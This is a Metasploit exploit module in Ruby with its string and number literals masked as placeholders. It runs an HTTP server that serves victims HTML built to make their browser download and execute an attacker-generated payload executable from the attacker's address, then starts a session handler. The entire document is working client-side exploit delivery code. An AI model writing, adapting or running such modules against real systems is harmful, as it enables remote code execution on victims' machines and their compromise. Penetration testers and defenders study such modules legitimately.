require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: EXE def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > - <int> , } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def autofilter false end def check_dependencies use_zlib end def on_request_uri ( cli , request ) payload_url = <str> payload_url += ( datastore [ <str> ] == <str> ) ? Rex :: Socket . source_address ( cli . peerhost ) : datastore [ <str> ] payload_url += <str> + datastore [ <str> ] . to_s + get_resource ( ) + <str> if ( request . uri . match ( <str> ) ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) data = generate_payload_exe ( { <str> = > p . encoded } ) print_status ( <str> ) send_response ( cli , data , { <str> = > <str> } ) return end vname = rand_text_alpha ( rand ( <int> ) + <int> ) exe = rand_text_alpha_upper ( rand ( <int> ) + <int> ) content = <str> vname <str> vname <str> payload_url <str> exe <str> datastore [ <str> ] <str> exe <str> datastore [ <str> ] <str> exe <str> print_status ( <str> self . name <str> ) send_response_html ( cli , content ) handler ( cli ) end end 
